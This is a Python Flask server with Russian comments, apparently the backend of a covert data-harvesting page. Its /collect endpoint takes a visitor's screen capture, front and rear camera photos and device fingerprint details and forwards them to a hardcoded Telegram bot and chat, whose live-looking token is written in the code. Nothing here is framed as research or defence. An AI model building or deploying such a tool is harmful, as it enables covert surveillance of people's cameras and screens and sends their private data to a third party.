import os
import base64
import json
import logging
from datetime import datetime

import requests
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ====== НАСТРОЙКИ ======
TELEGRAM_TOKEN = "8757264040:AAEQr6UPKMeaR_9PWv_Np5F-vLcXag2GyXc"   
CHAT_ID = "8382511631"                       
# ========================

TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"


def send_telegram_photo(base64_data, caption):
    """Отправляет фото в Telegram"""
    try:
        if "," in base64_data:
            base64_data = base64_data.split(",")[1]
        photo_bytes = base64.b64decode(base64_data)

        files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
        data = {
            "chat_id": CHAT_ID,
            "caption": caption,
            "parse_mode": "HTML"
        }
        resp = requests.post(f"{TELEGRAM_API}/sendPhoto", files=files, data=data)
        return resp.ok
    except Exception as e:
        print(f"Ошибка отправки фото: {e}")
        return False


def send_telegram_text(text):
    """Отправляет текст в Telegram"""
    try:
        resp = requests.post(f"{TELEGRAM_API}/sendMessage", json={
            "chat_id": CHAT_ID,
            "text": text,
            "parse_mode": "HTML"
        })
        return resp.ok
    except Exception as e:
        print(f"Ошибка отправки текста: {e}")
        return False


def format_device_info(device):
    """Форматирует информацию об устройстве"""
    screen = device.get("screen", {})
    parts = [
        "📱 Информация об устройстве",
        f"• Браузер: {device.get('userAgent', 'N/A')[:50]}",
        f"• Платформа: {device.get('platform', 'N/A')}",
        f"• Язык: {device.get('language', 'N/A')}",
        f"• Экран: {screen.get('width', '?')}x{screen.get('height', '?')}",
        f"• Ядер CPU: {device.get('hardwareConcurrency', 'N/A')}",
        f"• Память: {device.get('deviceMemory', 'N/A')} GB",
        f"• Часовой пояс: {device.get('timezone', 'N/A')}",
    ]
    return "\n".join(parts)


@app.route("/")
def index():
    """Главная страница — отдаёт HTML"""
    return render_template("index.html")


@app.route("/collect", methods=["POST"])
def collect():
    """Принимает данные и отправляет в Telegram"""
    try:
        data = request.get_json(force=True)
        device = data.get("device", {})
        device_info = format_device_info(device)

        photos_sent = 0

        # Отправляем скриншот
        if data.get("screenCapture"):
            if send_telegram_photo(data["screenCapture"], f"🖥 Скриншот экрана\n\n{device_info}"):
                photos_sent += 1

        # Отправляем фронталку
        if data.get("frontCamera"):
            if send_telegram_photo(data["frontCamera"], f"📸 Фронтальная камера\n\n{device_info}"):
                photos_sent += 1

        # Отправляем тыловую
        if data.get("backCamera"):
            if send_telegram_photo(data["backCamera"], f"📸 Тыловая камера\n\n{device_info}"):
                photos_sent += 1

        # Если фото нет — шлём просто текст
        if photos_sent == 0:
            send_telegram_text(f"⚠️ Фото не получены\n\n{device_info}")

        return {"status": "ok", "photos_sent": photos_sent}

    except Exception as e:
        print(f"Ошибка: {e}")
        return {"status": "error", "message": str(e)}, 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
